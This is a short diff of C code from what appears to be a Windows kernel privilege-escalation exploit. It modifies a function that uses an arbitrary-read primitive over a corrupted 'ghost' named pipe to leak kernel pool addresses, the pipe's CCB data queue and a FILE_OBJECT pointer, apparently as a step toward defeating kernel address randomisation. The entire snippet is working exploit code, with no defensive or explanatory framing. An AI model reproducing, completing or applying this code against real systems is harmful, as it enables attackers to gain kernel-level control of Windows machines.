@@ -13,14 +13,14 @@
 
 uintptr_t findKernelBase(pipe_pair_t* ghost_pipe, exploit_addresses_t* addrs)
 {
-    uintptr_t pipe_queue_entry_addr;
-    ArbitraryRead(ghost_pipe, addrs->root_pipe_queue_entry, (char*)&pipe_queue_entry_addr, 0x8);
-    printf("[+] pipe_queue_entry_addr: 0x%llX\n", pipe_queue_entry_addr);
+    uintptr_t ghost_np_data_queue_entry;
+    ArbitraryRead(ghost_pipe, addrs->np_cbb_data_queue, (char*)&ghost_np_data_queue_entry, 0x8);
+    printf("[+] ghost_np_data_queue_entry: 0x%llX\n", ghost_np_data_queue_entry);
 
-    addrs->ghost_vs_chunk = pipe_queue_entry_addr - sizeof(POOL_HEADER) - sizeof(HEAP_VS_CHUNK_HEADER);
+    addrs->ghost_vs_chunk = ghost_np_data_queue_entry - sizeof(POOL_HEADER) - sizeof(HEAP_VS_CHUNK_HEADER);
     printf("[+] ghost_chunk: 0x%llX\n", addrs->ghost_vs_chunk);
 
-    uintptr_t file_object_ptr = addrs->root_pipe_queue_entry - ROOT_PIPE_QUEUE_ENTRY_OFFSET + FILE_OBJECT_OFFSET;
+    uintptr_t file_object_ptr = addrs->np_cbb_data_queue - NP_CCB_DataQueue_OFFSET + NP_CCB_FileObject_OFFSET;
     uintptr_t file_object;
     ArbitraryRead(ghost_pipe, file_object_ptr, (char*)&file_object, 0x8);
     printf("[+] FILE_OBJECT: 0x%llX\n", file_object);
